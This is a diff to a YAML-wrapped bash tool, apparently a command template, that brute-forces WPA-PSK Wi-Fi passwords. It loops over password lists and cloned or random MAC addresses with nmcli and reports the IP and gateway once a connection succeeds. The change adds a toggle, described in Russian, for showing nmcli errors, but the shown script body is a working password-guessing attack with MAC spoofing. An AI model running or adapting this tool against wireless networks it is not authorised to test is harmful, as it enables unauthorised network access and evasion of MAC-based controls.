@@ -32,6 +32,12 @@ arguments:
     multiple: true
     replacer: '#macaddr#'
     metavar: MAC
+  v:
+    default:
+      - N
+      - Y
+    description: показывать ошибки nmcli
+    replacer: '#DEVNULL#'
 
 mode:
   format:
@@ -39,6 +45,11 @@ mode:
     s: '{!r}'
     p: '{!r}'
     m: '{!r}'
+  replace:
+    v:
+      N: '&>/dev/null'
+      Y: ''
+
 
 shell: bash
 script: >-
@@ -60,7 +71,7 @@ script: >-
   for macaddr in #macaddr# "$randmac"; do
   for password in #PASS#; do
   echo -n "[$macaddr][$password] ... ";
-  sudo nmcli connection add type wifi connection.autoconnect no con-name $conname ssid "$ssid" ifname "$interface" wifi.cloned-mac-address "$macaddr" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "$password" &>/dev/null;
-  sudo nmcli connection up "$conname" &>/dev/null && { echo -e "\e[1;92mCONNECTED\e[0m"; echo; echo "Connection info:";echo "[nmcli] name:    $conname"; nmcli --fields 'IP4.ADDRESS' connection show $conname | awk -F '[ ]+' '{print "[nmcli] ip:      " $2}'; nmcli --fields 'IP4.GATEWAY' connection show $conname | awk -F '[ ]+' '{print "[nmcli] gateway: " $2}'; break 2; } || { echo -e "\e[1;91mFAIL\e[0m"; sudo nmcli connection delete "$conname" &>/dev/null; };
+  sudo nmcli connection add type wifi connection.autoconnect no con-name $conname ssid "$ssid" ifname "$interface" wifi.cloned-mac-address "$macaddr" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "$password" #DEVNULL#;
+  sudo nmcli connection up "$conname" #DEVNULL# && { echo -e "\e[1;92mCONNECTED\e[0m"; echo; echo "Connection info:";echo "[nmcli] name:    $conname"; nmcli --fields 'IP4.ADDRESS' connection show $conname | awk -F '[ ]+' '{print "[nmcli] ip:      " $2}'; nmcli --fields 'IP4.GATEWAY' connection show $conname | awk -F '[ ]+' '{print "[nmcli] gateway: " $2}'; break 2; } || { echo -e "\e[1;91mFAIL\e[0m"; sudo nmcli connection delete "$conname" #DEVNULL#; };
   done;
   done
